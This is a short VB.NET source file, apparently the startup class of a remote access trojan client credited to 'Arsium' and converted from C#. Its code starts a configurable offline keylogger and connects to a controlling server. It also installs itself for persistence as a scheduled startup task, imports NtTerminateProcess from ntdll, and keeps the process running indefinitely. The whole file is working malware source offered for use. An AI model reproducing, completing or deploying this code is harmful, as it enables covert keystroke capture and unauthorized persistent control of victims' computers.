Imports System.Runtime.InteropServices
Imports System.Threading

' 
'|| AUTHOR Arsium ||
'|| github : https://github.com/arsium       ||
'|| Converted from C# code with Tangible Source Code Converters 2022.01 ||
'

Namespace Client
	Public Class StarterClass

		Friend Shared KeylogOn As Boolean

		Shared Sub New()
			KeylogOn = False
			clientHandler = New ClientHandler()
			StartOfflineKeylogger()
		End Sub

		Friend Shared Sub StartOfflineKeylogger()
			If Not StarterClass.KeylogOn And Config.offKeylog <> "False" Then
				Plugin.Launch.Start()
				KeylogOn = True
			End If
		End Sub


		<DllImport("ntdll.dll")>
		Friend Shared Function NtTerminateProcess(ByVal hProcess As IntPtr, ByVal errorStatus As Integer) As UInteger
		End Function

		Friend Shared clientHandler As ClientHandler

		<MTAThread>
		Public Shared Sub Main()
			clientHandler.ConnectStart()
			MakeInstall()
			Call (New Thread(New ThreadStart(Sub()
												 Do
													 Thread.Sleep(-1)
												 Loop
											 End Sub))).Start()
		End Sub

		Public Shared Sub MakeInstall()
			Persistence.Launch.StartUpTaskScheduler(Config.time, Config.taskName)
		End Sub
	End Class
End Namespace
